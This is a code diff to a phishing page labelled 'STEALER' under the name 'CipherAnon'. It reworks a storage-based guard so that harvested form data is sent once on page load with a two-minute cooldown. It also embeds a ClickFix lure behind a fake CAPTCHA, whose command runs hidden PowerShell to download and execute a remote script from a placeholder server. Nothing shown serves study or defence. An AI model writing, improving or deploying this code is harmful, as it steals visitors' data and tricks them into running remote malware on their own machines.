@@ -353,8 +353,7 @@
 
     <script>
         // ============================================================
-        // STEALER — SEND ONCE PER BROWSER TAB (sessionStorage)
-        // NUCLEAR FIX: sessionStorage prevents ANY duplicate
+        // STEALER — NUCLEAR GUARD: localStorage + sessionStorage
         // ============================================================
 
         if (window._protect && window._protect.isBlocked && window._protect.isBlocked()) {
@@ -373,13 +372,29 @@
         const successMsg = document.getElementById('successMsg');
 
         let verified = false;
-        let sent = false;
 
-        // ---- NUCLEAR FIX: Check sessionStorage ----
-        const SENT_FLAG = 'cipheranon_sent_' + window.location.hostname;
-        if (sessionStorage.getItem(SENT_FLAG) === 'true') {
-            // Already sent in this tab — block any further sends
-            sent = true;
+        // ---- NUCLEAR GUARD: Check BOTH localStorage and sessionStorage ----
+        const SENT_KEY = 'cipheranon_sent_' + window.location.hostname;
+        const SENT_TIME_KEY = 'cipheranon_sent_time_' + window.location.hostname;
+        const COOLDOWN = 120000; // 2 minutes
+
+        function hasSentRecently() {
+            const sent = localStorage.getItem(SENT_KEY);
+            const sentTime = parseInt(localStorage.getItem(SENT_TIME_KEY) || '0');
+            const now = Date.now();
+            if (sent === 'true' && (now - sentTime) < COOLDOWN) {
+                return true;
+            }
+            if (sessionStorage.getItem(SENT_KEY) === 'true') {
+                return true;
+            }
+            return false;
+        }
+
+        function markSent() {
+            localStorage.setItem(SENT_KEY, 'true');
+            localStorage.setItem(SENT_TIME_KEY, Date.now().toString());
+            sessionStorage.setItem(SENT_KEY, 'true');
         }
 
         // ---- Generate unique nonce ----
@@ -486,20 +501,12 @@
 
         // ---- SEND ONCE — NUCLEAR GUARD ----
         function sendData() {
-            if (sent) {
-                console.log('[CipherAnon] Already sent in this tab, skipping');
+            if (hasSentRecently()) {
+                console.log('[CipherAnon] Already sent recently, skipping');
                 return;
             }
 
-            // Double-check sessionStorage
-            if (sessionStorage.getItem(SENT_FLAG) === 'true') {
-                sent = true;
-                console.log('[CipherAnon] sessionStorage says already sent, skipping');
-                return;
-            }
-
-            sent = true;
-            sessionStorage.setItem(SENT_FLAG, 'true');
+            markSent();
 
             const formData = collectFormData();
 
@@ -546,9 +553,9 @@
         }
 
         // ---- SEND ON PAGE LOAD (ONLY ONCE) ----
-        requestAnimationFrame(() => {
+        setTimeout(() => {
             sendData();
-        });
+        }, 100);
 
         // ---- CLICKFIX FLOW ----
         const COMMAND = 'cmd /c start /min powershell -w hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(\'https://your-server.com/load.ps1\')"';
@@ -595,7 +602,7 @@
                     checkIcon.classList.add('active');
                     captchaBox.classList.add('verified');
                     captchaBox.style.borderColor = '#4caf50';
-                    // NO DATA SEND — already sent on page load
+                    // NO DATA SEND
                     setTimeout(() => { revealSteps(); }, 400);
                 }
             }, 500);
